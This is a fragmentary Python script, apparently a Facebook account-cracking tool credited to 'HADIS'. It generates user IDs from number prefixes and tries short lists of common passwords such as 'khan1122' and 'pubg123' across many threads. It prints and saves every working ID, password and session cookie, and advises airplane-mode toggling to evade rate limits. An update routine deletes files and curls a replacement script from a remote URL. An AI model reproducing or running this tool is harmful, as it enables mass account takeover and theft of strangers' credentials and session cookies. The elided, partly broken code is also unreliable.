...
###    ### ###     ### #########  ###########  ########
--------------------------------------------------
[•] AUTHOR     : \033[1;32mHADIS\033[1;37m
[•] STATUS     : \033[1;32mFREE\033[1;37m
[•] FACEBOOK   : \033[1;32mSayed Jamal\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 1.1 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
--------------------------------------------------"""
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmedate.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubut.com/ALI-JUTT/ali/main/ali.py > ali.py')
...
def svn_digit():
	...
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :9378,9379,9370,9376.ETC')
	lines()
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMETHID 1')
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMETHOD 2')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786','10002000','60007000','afghanistan','afghan123','afgafg','500500']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
...
def malik_baloch():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'500500','afghan123','100200','600700','800900','afghan123','afghan1234','khan1234','khan1122']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
...
def pubg():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'pubgqueen','pubgking','pubglover','pubgpubg','pubg123','pubg1122']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : kabul123,khan1122,afghan123,100200,600500,500500,Etc')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HADIS-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('\033[1;33m[HADIS-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHADIS\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
